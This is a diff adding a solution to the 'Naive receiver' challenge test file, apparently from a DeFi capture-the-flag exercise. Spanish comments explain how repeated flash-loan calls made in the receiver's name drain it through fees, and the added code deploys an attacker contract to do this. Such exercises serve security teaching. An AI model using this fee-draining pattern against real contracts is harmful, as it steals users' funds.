@@ -30,7 +30,13 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        // Despliego un contrato en el que llamo a pedir una loan en nombre del receiver 10 veces, le cobra 1 por cada llamada
+        // el error esta en que no se deberia de poder especificar la direccion de quien pide la loan en el metodo, y el
+        // receiver no deberia de poder llamar ese metodo asi de gratis para pagar de vuelta, tendria que autenticar
+        const AttackerFactory = await ethers.getContractFactory('NaiveAttacker', attacker);
+        this.attacker = await AttackerFactory.deploy(this.pool.address);
+        this.attacker.flashLoan(this.receiver.address);
     });
 
     after(async function () {
